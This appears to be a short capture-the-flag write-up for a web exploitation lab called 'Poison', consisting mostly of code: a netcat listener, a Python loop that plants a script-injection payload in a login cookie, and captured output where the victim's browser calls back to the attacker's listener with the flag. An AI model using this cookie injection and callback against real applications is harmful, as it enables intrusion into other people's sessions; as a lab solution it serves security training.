---
title: Poison
category: Web Exploitation
tags: 
draft: true
completedDuringEvent: true
submitted: true
points: 90
solves: -1
flag: THM{REDACTED}
---
> The CRM interface on the plant's internal network was supposed to help operators manage sensor maintenance and schedule firmware patches. Instead, someone turned it into a silent threat vector.
>
> A lab technician reported several inconsistencies. Data from the interface showed altered update statuses, injected redirects, and phantom users. Moments later, a batch of remote firmware triggers was misrouted… straight into the wrong PLCs.

---

```sh
nc -lnvp 1337
```

```py
import requests
import time

url = "http://10.10.67.238:8000/user.php"
cookie_value = "<script>setTimeout(() => fetch('http://10.17.37.98:1337/'), 2000)</script>"
cookies = {
    "loggedin": cookie_value
}

while True:
    try:
        response = requests.get(url, cookies=cookies)
        print(f"[+] Sent payload. Status: {response.status_code}")
        print(f"[+] Response body: {response.text}")
    except Exception as e:
        print(f"[-] Error: {e}")

    time.sleep(1)
```

```sh
$ $ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.17.37.98] from (UNKNOWN) [10.10.67.238] 48698
GET / HTTP/1.1
Host: 10.17.37.98:1337
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 THM{REDACTED}
Accept: */*
Origin: http://10.10.67.238:8000
Referer: http://10.10.67.238:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

`User-Agent: ... Safari/537.36 THM{REDACTED}`
